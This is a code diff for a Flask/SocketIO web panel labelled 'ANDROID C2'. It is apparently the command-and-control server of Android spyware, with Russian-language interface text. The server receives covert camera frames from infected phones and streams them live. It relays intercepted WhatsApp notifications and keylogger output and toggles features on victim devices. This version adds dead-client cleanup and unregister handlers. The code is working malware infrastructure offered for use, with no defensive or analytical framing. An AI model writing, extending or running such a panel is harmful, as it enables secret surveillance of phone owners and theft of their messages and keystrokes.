@@ -3,7 +3,7 @@ from flask_socketio import SocketIO
 import os
 import time
 import base64
-import datetime
+import threading
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
@@ -11,8 +11,8 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
 clients = {}
 camera_frames = {}
+last_seen = {}
 activity_logs = {}
-wa_logs = {}
 
 HTML = """
 <!DOCTYPE html>
@@ -37,8 +37,6 @@ HTML = """
         .client-row { transition: background-color 0.2s; }
         .client-row:hover { background-color: #1f2937; cursor: pointer; }
         .client-row.selected { background-color: #1e3a8a; border-left: 3px solid #60a5fa; }
-        .tab-btn { transition: all 0.2s; border-bottom: 2px solid transparent; }
-        .tab-btn.active { border-bottom-color: #3b82f6; color: #60a5fa; }
         .toggle-switch { position: relative; display: inline-block; width: 40px; height: 22px; }
         .toggle-switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .3s; border-radius: 22px; }
@@ -47,32 +45,15 @@ HTML = """
         input:checked + .slider:before { transform: translateX(18px); }
         .fade-in { animation: fadeIn 0.3s ease-in-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-        .dropdown-wrap { position: relative; width: 100%; padding: 10px; border-bottom: 1px solid #1f2937; background: #0d1117; }
-        .dropdown-btn { width: 100%; display: flex; justify-content: space-between; align-items: center; background: #1f2937; color: #e5e7eb; padding: 10px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; border: 1px solid #374151; transition: all 0.2s ease; }
-        .dropdown-btn:hover { background: #374151; border-color: #3b82f6; }
-        .dropdown-btn .chevron { transition: transform 0.3s ease; }
-        .dropdown-wrap.open .dropdown-btn .chevron { transform: rotate(180deg); }
-        .dropdown-menu { position: absolute; top: calc(100% - 2px); left: 10px; right: 10px; z-index: 50; background: #111827; border: 1px solid #1f2937; border-radius: 8px; overflow: hidden; max-height: 0; opacity: 0; transition: all 0.3s ease; pointer-events: none; }
-        .dropdown-wrap.open .dropdown-menu { max-height: 300px; opacity: 1; pointer-events: auto; }
     </style>
 </head>
 <body class="h-screen overflow-hidden flex">
 
+    <!-- SIDEBAR -->
     <aside class="sidebar w-72 flex flex-col h-full">
         <div class="p-4 border-b border-gray-800 flex items-center gap-3">
             <div class="w-8 h-8 rounded bg-green-600 flex items-center justify-center text-white font-bold"><i class="fa-solid fa-mobile-screen"></i></div>
-            <div><h1 class="text-sm font-bold text-white">ANDROID C2</h1><p class="text-[10px] text-gray-500 font-mono">v10.0.0</p></div>
-        </div>
-
-        <div class="dropdown-wrap" id="dropdownWrap">
-            <button class="dropdown-btn" onclick="toggleDropdown(event)">
-                <span class="label"><i class="fa-solid fa-list-check"></i> <span>ВЫБРАТЬ</span></span>
-                <i class="fa-solid fa-chevron-down chevron text-xs text-gray-400"></i>
-            </button>
-            <div class="dropdown-menu" onclick="event.stopPropagation()">
-                <div class="p-2 text-xs font-semibold text-gray-500 uppercase">Android Devices</div>
-                <div class="p-2 text-sm text-gray-300 hover:bg-gray-700 cursor-pointer" onclick="pickPlatform('phone')">Телефоны (Android)</div>
-            </div>
+            <div><h1 class="text-sm font-bold text-white">ANDROID C2</h1><p class="text-[10px] text-gray-500 font-mono">v11.0.0</p></div>
         </div>
 
         <div class="flex-1 overflow-y-auto p-2">
@@ -94,6 +75,7 @@ HTML = """
         </div>
     </aside>
 
+    <!-- MAIN CONTENT -->
     <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative">
         <header class="h-14 border-b border-gray-800 flex items-center justify-between px-6 bg-[#111827]">
             <div class="flex items-center gap-4">
@@ -221,14 +203,6 @@ HTML = """
             return `${h} ч ${m % 60} мин`;
         }
 
-        function toggleDropdown(e) { e.stopPropagation(); document.getElementById('dropdownWrap').classList.toggle('open'); }
-        document.addEventListener('click', () => document.getElementById('dropdownWrap').classList.remove('open'));
-
-        function pickPlatform(platform) {
-            document.getElementById('dropdownWrap').classList.remove('open');
-            socket.emit('get_clients_ping');
-        }
-
         socket.on('update_clients', (data) => {
             lastClientsData = data;
             const list = document.getElementById('client-list');
@@ -326,6 +300,19 @@ HTML = """
 </html>
 """
 
+# Фоновая очистка мертвых клиентов (если не слали пинг более 2 минут)
+def cleanup_loop():
+    while True:
+        now = time.time()
+        dead = [cid for cid, t in last_seen.items() if now - t > 120]
+        for cid in dead:
+            if cid in clients: del clients[cid]
+            if cid in last_seen: del last_seen[cid]
+            if cid in camera_frames: del camera_frames[cid]
+        if dead:
+            socketio.emit('update_clients', clients)
+        time.sleep(10)
+
 @app.route('/')
 def index(): return render_template_string(HTML)
 
@@ -336,19 +323,35 @@ def video_feed(cid):
             if cid in camera_frames and camera_frames[cid]:
                 frame = camera_frames[cid]
                 yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-            time.sleep(0.05) 
+            time.sleep(0.1)
     return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+# Ручное удаление
+@app.route('/unregister/<cid>', methods=['GET', 'POST'])
+def unregister(cid):
+    if cid in clients: del clients[cid]
+    if cid in last_seen: del last_seen[cid]
+    if cid in camera_frames: del camera_frames[cid]
+    socketio.emit('update_clients', clients)
+    return "OK"
 
 @socketio.on('connect')
 def handle_connect(): socketio.emit('update_clients', clients)
 
-@socketio.on('get_clients_ping')
-def handle_ping(): socketio.emit('update_clients', clients)
-
 @socketio.on('register_client')
 def handle_register(data):
+    cid = data['id']
     data['connected_at'] = time.time()
-    clients[data['id']] = data
+    clients[cid] = data
+    last_seen[cid] = time.time()
+    socketio.emit('update_clients', clients)
+
+@socketio.on('unregister')
+def handle_unregister(data):
+    cid = data.get('id')
+    if cid in clients: del clients[cid]
+    if cid in last_seen: del last_seen[cid]
+    if cid in camera_frames: del camera_frames[cid]
     socketio.emit('update_clients', clients)
 
 @socketio.on('toggle_feature')
@@ -375,6 +378,7 @@ def handle_phone_cam_frame(data):
     img_b64 = data.get('img')
     if cid and img_b64:
         camera_frames[cid] = base64.b64decode(img_b64)
+        last_seen[cid] = time.time()
 
 @socketio.on('whatsapp_notify')
 def handle_whatsapp(data): socketio.emit('whatsapp_msg', data)
@@ -383,4 +387,5 @@ def handle_whatsapp(data): socketio.emit('whatsapp_msg', data)
 def handle_keylog(data): socketio.emit('keylog', data)
 
 if __name__ == '__main__':
+    threading.Thread(target=cleanup_loop, daemon=True).start()
     socketio.run(app, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
